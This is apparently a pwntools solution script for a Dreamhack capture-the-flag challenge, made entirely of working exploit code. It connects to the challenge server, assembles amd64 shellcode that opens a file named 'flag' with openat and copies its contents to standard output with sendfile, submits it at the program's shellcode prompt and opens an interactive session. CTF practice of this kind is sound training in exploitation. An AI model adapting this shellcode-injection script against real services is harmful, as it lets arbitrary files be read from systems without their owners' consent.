from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11130
r = remote(HOST, PORT)

sh=asm('''
    xor rax, rax
    push rax
    mov rax, 0x67616c66
    push rax
    mov rsi, rsp
    mov rax, SYS_openat
    mov rdi, AT_FDCWD
    xor rdx, rdx
    syscall

    mov rsi, rax
    mov rax, SYS_sendfile
    mov rdi, 1
    xor rdx, rdx
    mov r10, 0x100
    syscall
''')
r.sendlineafter(b'shellcode: ', sh)
r.interactive()